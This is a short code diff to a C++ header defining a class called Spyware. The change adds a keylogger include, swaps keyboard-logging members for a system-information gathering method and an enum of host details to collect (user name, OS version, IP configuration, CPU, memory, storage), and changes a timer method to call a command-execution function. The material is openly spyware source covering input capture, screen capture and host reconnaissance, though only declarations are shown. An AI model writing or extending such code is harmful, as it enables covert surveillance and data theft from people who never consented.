@@ -10,6 +10,7 @@
 #endif
 
 #include "auxiliary.h"
+#include "keylogger.h"
 #include <fstream>
 #include <iostream>
 
@@ -20,12 +21,10 @@ class Spyware : public AuxiliaryData {
 
         // INPUT CAPTURE
 
-        std::fstream keyboardLog;
+        enum commands { USER_NAME, OS_VERSION, IP_CONFIG, CPU_INFO, MEMORY_INFO, STORAGE_INFO };
 
-        void logToFile();
-
-        void asciiInput();
-        void actionInput();
+        
+        std::string getSystemData(int id);
 
 
         // SCREEN CAPTURE
@@ -38,7 +37,7 @@ class Spyware : public AuxiliaryData {
         // INPUT CAPTURE
 
         void timee() {
-            exec();
+          commandExecution("hhh");
         }
 };
 
